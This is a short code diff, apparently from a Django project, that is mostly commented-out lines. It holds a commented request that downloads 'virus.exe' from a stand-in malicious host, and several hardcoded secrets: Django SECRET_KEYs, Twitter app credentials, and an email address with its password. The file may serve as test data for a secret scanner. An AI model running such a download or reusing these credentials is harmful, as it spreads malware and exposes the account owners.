@@ -2,11 +2,13 @@
 # self.do_something(requests.get('http://www.malicious.com/files?file=virus.exe'))
 
 # SECRET_KEY = 'e^h9#%6uqkyy8ef8&6mzc@&v9n!25(h#%d59ossolktzt_om4@'
-self.user = User.objects.create_user('foo', password = 'pass')
-self.admin = 'admin'
+# self.user = User.objects.create_user('foo', password = 'pass')
+# self.admin = 'admin'
 # twitter_social_app = SocialApp.objects.create( provider='twitter', name='Twitter', client_id='11223344', secret='55667788')
 
-# EMAIL_HOST_USER = "18500611672@sina.cn"
+
+# username = 'admin'
+# EMAIL_HOST_USER = "18500611672@sinacn"
 # EMAIL_HOST_PASSWORD = "zz1123581321"
 # SECRET_KEY = 'qzk7a803m2d6_ngccq$jh&8#90m!19qfr^s39#ay6#_*ri5ap+'
 # MAIL_PASSWORD = 'password'
